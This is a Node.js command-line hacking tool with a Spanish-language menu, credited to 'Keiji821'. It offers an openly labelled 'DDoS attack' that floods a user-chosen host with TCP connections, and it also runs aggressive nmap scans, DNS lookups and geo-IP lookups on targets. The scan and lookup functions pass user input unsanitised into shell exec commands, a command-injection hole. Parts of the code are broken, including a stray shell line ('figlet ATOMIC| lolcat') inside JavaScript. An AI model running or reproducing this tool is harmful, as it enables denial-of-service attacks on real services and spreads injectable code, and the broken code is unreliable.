const net = require('net');
const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

const colors = {
  reset: '[0m',
  bright: '[1m',
  dim: '[2m',
  underscore: '[4m',
  blink: '[5m',
  reverse: '[7m',
  hidden: '[8m',
  fg: {
    black: '[30m',
    red: '[31m',
    green: '[32m',
    yellow: '[33m',
    blue: '[34m',
    magenta: '[35m',
    cyan: '[36m',
    white: '[37m',
  },
  bg: {
    black: '[40m',
    red: '[41m',
    green: '[42m',
    yellow: '[43m',
    blue: '[44m',
    magenta: '[45m',
    cyan: '[46m',
    white: '[47m',
  }
};

const decorations = {
  underline: '[4m',
  bold: '[1m',
  italic: '[3m',
};

const async = require('async');
const axios = require('axios');
const { exec } = require('child_process');


const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`[32m[1m Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`[31m[1m
 ╭────────────────────────────────╮
 │ ⚠️ Conectado a ${url}   │
 ╰────────────────────────────────╯`);
});
socket.on('data', (data) => {
console.log(`[33m[1m Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('[32m[1m Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`[36m[1m Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`[32m[1m Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};


const getInfo = async (ip) => {
try {
const command = `dig +nocmd ${ip} any +multiline`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);
const details = [];
for (const line of lines) {
if (line.includes(';; ANSWER SECTION:')) {
details.push('** ANSWER SECTION **');
} else if (line.includes(';')) {
const [key, value] = line.split(';');
details.push(`  ${key.trim()}: ${value.trim()}`);
} else {
const parts = line.split(/\s+/);
const recordType = parts[3];
const ttl = parts[1];
const value = parts[4];
switch (recordType) {
case 'A':
details.push(`  IP Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'AAAA':
details.push(`  IPv6 Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'NS':
details.push(`  Name Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'MX':
details.push(`  Mail Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'SOA':
details.push(`  Start of Authority: ${value} (TTL: ${ttl} seconds)`);
break;
default:
details.push(`  Unknown Record Type: ${recordType} (TTL: ${ttl} seconds)`);
}
}
}
console.log(` DNS Information for ${ip}:`);
console.log(`---------------------------`);
console.log(details.join(String.raw`
`));
console.log(`---------------------------`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


const analyzeIP = async (ip) => {
try {
const command = `nmap -A -T4 ${ip}`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);

let openPorts = [];
let services = {};
let os = '';
let deviceType = '';
let uptime = '';
let tcpSequence = '';
let ipIdSequence = '';
let osCPE = '';
let osGeneration = '';

lines.forEach((line) => {
const parts = line.trim().split(/ +/);
if (parts.length > 3 && parts[1] === 'open') {
const port = parts[0];
const state = parts[1];
const service = parts[2];
const version = parts.slice(3).join(' ');
openPorts.push({ port, state, service, version });
services[port] = service;
} else if (parts[0] === 'OS:') {
os = parts.slice(1).join(' ');
} else if (parts[0] === 'CPE:') {
osCPE = parts.slice(1).join(' ');
} else if (parts[0] === 'Device') {
deviceType = parts.slice(2).join(' ');
} else if (parts[0] === 'Uptime:') {
uptime = parts.slice(1).join(' ');
} else if (parts[0] === 'TCP') {
tcpSequence = parts.slice(3).join(' ');
} else if (parts[0] === 'IP') {
ipIdSequence = parts.slice(3).join(' ');
} else if (parts[0] === 'OS') {
osGeneration = parts.slice(2).join(' ');
}
});

console.log(`Nmap scan report for ${ip}`);
console.log(`Host is up.
`);

console.log(`PORT      STATE SERVICE    VERSION`);
openPorts.forEach((port) => {
console.log(`${port.port}      ${port.state} ${port.service}    ${port.version}`);
});

console.log(`
Service Info:`);
console.log(`OS: ${os} (${osCPE})`);
console.log(`Device type: ${deviceType}`);
console.log(`Uptime: ${uptime}`);
console.log(`TCP Sequence Prediction: ${tcpSequence}`);
console.log(`IP ID Sequence Generation: ${ipIdSequence}`);
console.log(`OS Generation: ${osGeneration}`);

console.log(`
`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};






const getGeoIP = async (ip) => {
try {
const response = await axios.get(`http://ip-api.com/json/${ip}`);
const data = response.data;
console.log(` `);
console.log(`[32m[1m 
        ╭─────────────────────────╮
        │ 🌕 Información de la IP │
        ╰─────────────────────────╯`);
console.log(`[32m[1m       〔[36m01[32m〕  [31m[1m IP: [36m ${data.query}`);
console.log(`[32m[1m       〔[36m02[32m〕  [31m[1m Estatus: [36m ${data.status}`);
console.log(`[32m[1m       〔[36m03[32m〕  [31m[1m Continente: [36m ${data.continent}`);
console.log(`[32m[1m       〔[36m04[32m〕  [31m[1m Código del continente: [36m ${data.continentCode}`);
console.log(`[32m[1m       〔[36m05[32m〕  [31m[1m País: [36m ${data.country}`);
console.log(`[32m[1m       〔[36m06[32m〕  [31m[1m Código del país: [36m ${data.countryCode}`);
console.log(`[32m[1m       〔[36m07[32m〕  [31m[1m Región: [36m ${data.region}`);
console.log(`[32m[1m       〔[36m08[32m〕  [31m[1m Estado: [36m ${data.regionName}`);
console.log(`[32m[1m       〔[36m09[32m〕  [31m[1m Ciudad: [36m ${data.city}`);
console.log(`[32m[1m       〔[36m10[32m〕  [31m[1m  Distrito: [36m ${data.district}`);
console.log(`[32m[1m       〔[36m11[32m〕  [31m[1m  Código postal: [36m ${data.zip}`);
console.log(`[32m[1m       〔[36m12[32m〕  [31m[1m  Latitud: [36m ${data.lat}`);
console.log(`[32m[1m       〔[36m13[32m〕  [31m[1m  Longitud: [36m ${data.lon}`);
console.log(`[32m[1m       〔[36m14[32m〕  [31m[1m  Zona horaria: [36m ${data.timezone}`);
console.log(`[32m[1m       〔[36m15[32m〕  [31m[1m  Offset: [36m ${data.offset}`);
console.log(`[32m[1m       〔[36m16[32m〕  [31m[1m  Moneda: [36m ${data.currency}`);
console.log(`[32m[1m       〔[36m17[32m〕  [31m[1m  ISP: [36m ${data.isp}`);
console.log(`[32m[1m       〔[36m18[32m〕  [31m[1m  Empresa: [36m ${data.org}`);
console.log(`[32m[1m       〔[36m19[32m〕  [31m[1m  AS: [36m ${data.as}`);
console.log(`[32m[1m       〔[36m20[32m〕  [31m[1m  Nombre de AS: [36m ${data.asname}`);
console.log(`[32m[1m       〔[36m21[32m〕  [31m[1m  Es un celular: [36m ${data.mobile}`);
console.log(`[32m[1m       〔[36m22[32m〕  [31m[1m  Es un proxy: [36m ${data.proxy}`);
console.log(`[32m[1m       〔[36m23[32m〕  [31m[1m  Es un hosting: [36m ${data.hosting}`);
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


const showMenu = () => {
  console.clear();
  figlet ATOMIC| lolcat
  console.log('[36m[1m      ⭐️ Desarrollado por Keiji821');
  console.log('                ');
  console.log('[32m【1[32m】 [37m[1m Iniciar ataque DDoS');
  console.log('[32m【2[32m】 [37m[1m Actualizar código');
  console.log('[32m【3[32m】 [37m[1m Configurar conexiones simultáneas');
  console.log('[32m【4[32m】 [37m[1m Aumentar potencia del ataque');
  console.log('[32m【5[32m】 [37m[1m Información de DNS para una dirección IP');
  console.log('[32m【6[32m】 [37m[1m Análisis de IP');
  console.log('[32m【7[32m】 [37m[1m Información geográfica de IP');
  console.log('               ');
  console.log('[32m【0[32m】❌️ [31m[1m Salir');
  console.log('               ');
  rl.setPrompt('[37m[1m ｢🌐｣➤ ');
  rl.prompt();
};


let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto


rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('[36m[1m Ingrese la URL del objetivo');
rl.question('[32m[1m URL/IP: ', (url) => {
if (url === '') {
console.log('[31m[1m Url o ip invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu();
}
});
break;
case '2':
updateCode();
showMenu();
break;
case '3':
console.log('[36m[1m Ingrese el número de conexiones simultaneas');
rl.question('[32m[1m Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('[31m[1m Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`[36m[1m Conexiones simultaneas establecidas en ${numConnections}`);
showMenu();
}
});
break;
case '4':
console.log('[36m[1m Ingrese la duración del ataque (en segundos)');
rl.question('[32m[1m Duración: ', (duration) => {
if (duration === '') {
console.log('[31m[1m Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`[32m[1m Duración del ataque establecida en ${attackDuration} segundos`);
showMenu();
}
});
break;
case '5':
console.log('[36m[1m Ingrese la IP para obtener información');
rl.question('[32m[1m IP: ', (ip) => {
if (ip === '') {
console.log('[31m[1m IP invalida');
showMenu();
} else {
getInfo(ip);
showMenu();
}
});
break;
case '6':
console.log('[36m[1m Ingrese la ip o dominio para el análisis ');
rl.question('[32m[1m IP/Dominio: ', (ip) => {
if (ip === '') {
console.log('[31m[1m Ip o dominio invalido');
showMenu();
} else {
try {
analyzeIP(ip);
} catch (error) {
console.error(`[31m[1m Error al analizar IP: ${error.message}`);
}
showMenu();
}
});
break;
case '7':
console.log('[36m[1m Ingrese la ip o dominio para obtener información geográfica');
rl.question('[32m[1m IP/Dominio: ', (ip) => {
if (ip === '') {
console.log('[36m[1m Ip o dominio invalido');
showMenu();
} else {
getGeoIP(ip);
showMenu();
}
});
break;
case '0':
console.log('[32m[1m Saliendo...');
process.exit();
break;
default:
console.log('[31m[1m Opción invalida');
showMenu();
}
}).on('close', () => {
process.exit();
});